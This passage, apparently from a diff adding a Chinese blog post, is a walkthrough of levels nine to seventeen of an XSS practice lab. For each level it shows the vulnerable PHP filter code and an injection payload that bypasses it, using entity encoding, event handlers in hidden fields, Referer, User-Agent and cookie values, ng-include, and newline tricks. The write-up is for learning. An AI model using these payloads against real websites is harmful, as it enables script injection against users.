class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br><span class="line">$str7=str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot'</span>,$str6);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level9.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.htmlspecialchars($str).<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">false</span>===strpos($str7,<span class="string">'http://'</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;BR&gt;&lt;a href="您的链接不合法？有没有！"&gt;友情链接&lt;/a&gt;&lt;/center&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;BR&gt;&lt;a href="'</span>.$str7.<span class="string">'"&gt;友情链接&lt;/a&gt;&lt;/center&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p> 这里的情况基本和上一个一样，但是有点不一样的就是有个判断必须存在http://</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//payload</span><br><span class="line"><span class="symbol">&amp;#x006a;</span><span class="symbol">&amp;#x0061;</span><span class="symbol">&amp;#x0076;</span><span class="symbol">&amp;#x0061;</span><span class="symbol">&amp;#x0073;</span><span class="symbol">&amp;#x0063;</span><span class="symbol">&amp;#x0072;</span><span class="symbol">&amp;#x0069;</span><span class="symbol">&amp;#x0070;</span><span class="symbol">&amp;#x0074;</span><span class="symbol">&amp;#x003a;</span><span class="symbol">&amp;#x0061;</span><span class="symbol">&amp;#x006c;</span><span class="symbol">&amp;#x0065;</span><span class="symbol">&amp;#x0072;</span><span class="symbol">&amp;#x0074;</span><span class="symbol">&amp;#x0028;</span><span class="symbol">&amp;#x0031;</span><span class="symbol">&amp;#x0029;</span><span class="symbol">&amp;#x0020;</span><span class="symbol">&amp;#x002f;</span><span class="symbol">&amp;#x002f;</span> http://</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x09-第十关"><a href="#0x09-第十关" class="headerlink" title="0x09:第十关"></a>0x09:第十关</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str11 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里有个隐藏的参数，明面的参数不会输出，没有利用点。隐藏的参数过滤了&lt;,&gt;标签，可以用js事件,type改成text</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;payload</span><br><span class="line">?t_sort&#x3D;&quot; onclick&#x3D;alert(1) type&#x3D;&quot;text</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x10-第十一关"><a href="#0x10-第十一关" class="headerlink" title="0x10:第十一关"></a>0x10:第十一关</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str11=$_SERVER[<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.htmlspecialchars($str00).<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_ref"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>刚才利用的点被转义了，但是有个新的输出点，这里获取的是referer所以这里进行传值即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;payload</span><br><span class="line">&quot; onclick&#x3D;alert(1) type&#x3D;&quot;text</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x11-第十二关"><a href="#0x11-第十二关" class="headerlink" title="0x11:第十二关"></a>0x11:第十二关</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str11=$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.htmlspecialchars($str00).<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_ua"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里的利用点改成了user-agent参数，在这个地方修改传参就行</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//payload</span><br><span class="line">" onclick=alert(1) type="text</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x12-第十三关"><a href="#0x12-第十三关" class="headerlink" title="0x12:第十三关"></a>0x12:第十三关</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">setcookie(<span class="string">"user"</span>, <span class="string">"call me maybe?"</span>, time()+<span class="number">3600</span>);</span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str11=$_COOKIE[<span class="string">"user"</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.htmlspecialchars($str00).<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_cook"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里利用cookie传参就行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;payload</span><br><span class="line">user&#x3D;&quot; onclick&#x3D;alert(1) type&#x3D;&quot;text</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x13-第十四关"><a href="#0x13-第十四关" class="headerlink" title="0x13::第十四关"></a>0x13::第十四关</h2><p>这关好像连接有问题，所以就不管了</p>
+<h2 id="0x14-第十五关"><a href="#0x14-第十五关" class="headerlink" title="0x14:第十五关"></a>0x14:第十五关</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"src"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;body&gt;&lt;span class="ng-include:'</span>.htmlspecialchars($str).<span class="string">'"&gt;&lt;/span&gt;&lt;/body&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="定义和用法"><a href="#定义和用法" class="headerlink" title="定义和用法"></a>定义和用法</h2><p><strong>ng-include</strong> 指令用于包含外部的 HTML 文件。</p>
+<p>包含的内容将作为指定元素的子节点。</p>
+<p><code>ng-include</code> 属性的值可以是一个表达式，返回一个文件名。</p>
+<p>默认情况下，包含的文件需要包含在同一个域名下。</p>
+<p>这里可以利用第一关的文件进行包含</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;payload</span><br><span class="line">src&#x3D;&#39;level1.php?name&#x3D;test&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;&#39;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x15-第十六关"><a href="#0x15-第十六关" class="headerlink" title="0x15:第十六关"></a>0x15:第十六关</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"&amp;nbsp;"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">" "</span>,<span class="string">"&amp;nbsp;"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"/"</span>,<span class="string">"&amp;nbsp;"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"	"</span>,<span class="string">"&amp;nbsp;"</span>,$str4);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;center&gt;"</span>.$str5.<span class="string">"&lt;/center&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里过滤了空格，但是空格可以用%0a代替。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//payload</span><br><span class="line">?keyword=<span class="tag">&lt;<span class="name">img%0asrc=1%0aonerror=alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x16-第十七关"><a href="#0x16-第十七关" class="headerlink" title="0x16:第十七关"></a>0x16:第十七关</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;embed src=xsf01.swf?"</span>.htmlspecialchars($_GET[<span class="string">"arg01"</span>]).<span class="string">"="</span>.htmlspecialchars($_GET[<span class="string">"arg02"</span>]).<span class="string">" width=100% heigth=100%&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里用了转义函数，但是js事件还是可以用的。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//payload</span><br><span class="line">arg01=a&amp;arg02=b onmouseover=alert(1)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x17-第十八关"><a href="#0x17-第十八关" class="headerlink" title="0x17:第十八关"></a>0x17:第十八关</h2><p>这关基本上和上一关一样</p>
+<h2 id="0x18-第十九关"><a href="#0x18-第十九关" class="headerlink" title="0x18:第十九关"></a>0x18:第十九关</h2><p>这关和下关关于flash xss的，但是flash要关闭了，也就不研究了</p>
+<h2 id="0x19-第二十关"><a href="#0x19-第二十关" class="headerlink" title="0x19:第二十关"></a>0x19:第二十关</h2><h2 id="0x20-总结和参考"><a href="#0x20-总结和参考" class="headerlink" title="0x20:总结和参考"></a>0x20:总结和参考</h2><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>输入–服务器-输出</p>
+<p>输入：</p>
+<ol>
+<li>get参数</li>
+<li>post参数</li>
+<li>cookie</li>
+<li>referer</li>
+<li>user-agent</li>
+<li>….还有其他的输入点</li>
+</ol>
+<p>输出：只有最后拼接到界面中就可以了</p>
+<p>预防方式</p>
+<ol>
+<li>本身浏览器自带一些过滤方式</li>
+<li>前端输入过滤</li>
+<li>后端输入过滤</li>
+</ol>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ol>
+<li><a href="https://blog.csdn.net/Sc0fie1d/article/details/102504878?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase" target="_blank" rel="noopener">https://blog.csdn.net/Sc0fie1d/article/details/102504878?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase</a></li>
+</ol>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">主页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">文章</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-第一关"><span class="toc-number">1.</span> <span class="toc-text">0x00:第一关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-第二关"><span class="toc-number">2.</span> <span class="toc-text">0x01:第二关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-第三关"><span class="toc-number">3.</span> <span class="toc-text">0x02:第三关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-第四关"><span class="toc-number">4.</span> <span class="toc-text">0x03:第四关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-第五关"><span class="toc-number">5.</span> <span class="toc-text">0x04:第五关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-第六关"><span class="toc-number">6.</span> <span class="toc-text">0x05:第六关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-第七关"><span class="toc-number">7.</span> <span class="toc-text">0x06:第七关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-第八关"><span class="toc-number">8.</span> <span class="toc-text">0x07:第八关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-第九关"><span class="toc-number">9.</span> <span class="toc-text">0x08:第九关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x09-第十关"><span class="toc-number">10.</span> <span class="toc-text">0x09:第十关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x10-第十一关"><span class="toc-number">11.</span> <span class="toc-text">0x10:第十一关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x11-第十二关"><span class="toc-number">12.</span> <span class="toc-text">0x11:第十二关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x12-第十三关"><span class="toc-number">13.</span> <span class="toc-text">0x12:第十三关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x13-第十四关"><span class="toc-number">14.</span> <span class="toc-text">0x13::第十四关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x14-第十五关"><span class="toc-number">15.</span> <span class="toc-text">0x14:第十五关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#定义和用法"><span class="toc-number">16.</span> <span class="toc-text">定义和用法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x15-第十六关"><span class="toc-number">17.</span> <span class="toc-text">0x15:第十六关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x16-第十七关"><span class="toc-number">18.</span> <span class="toc-text">0x16:第十七关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x17-第十八关"><span class="toc-number">19.</span> <span class="toc-text">0x17:第十八关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x18-第十九关"><span class="toc-number">20.</span> <span class="toc-text">0x18:第十九关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x19-第二十关"><span class="toc-number">21.</span> <span class="toc-text">0x19:第二十关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x20-总结和参考"><span class="toc-number">22.</span> <span class="toc-text">0x20:总结和参考</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#总结"><span class="toc-number">22.1.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考"><span class="toc-number">22.2.</span> <span class="toc-text">参考</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/06/16/xsslab%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/06/16/xsslab%E7%AC%94%E8%AE%B0/&text=xsslab笔记" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/06/16/xsslab%E7%AC%94%E8%AE%B0/&title=xsslab笔记" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/06/16/xsslab%E7%AC%94%E8%AE%B0/&is_video=false&description=xsslab笔记" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=xsslab笔记&body=Check out this article: http://yoursite.com/2020/06/16/xsslab%E7%AC%94%E8%AE%B0/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/06/16/xsslab%E7%AC%94%E8%AE%B0/&title=xsslab笔记" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/06/16/xsslab%E7%AC%94%E8%AE%B0/&title=xsslab笔记" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/06/16/xsslab%E7%AC%94%E8%AE%B0/&title=xsslab笔记" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/06/16/xsslab%E7%AC%94%E8%AE%B0/&title=xsslab笔记" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/06/16/xsslab%E7%AC%94%E8%AE%B0/&name=xsslab笔记&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/06/16/xsslab%E7%AC%94%E8%AE%B0/&t=xsslab笔记" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2019-2020
+    bai191
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">主页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">文章</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
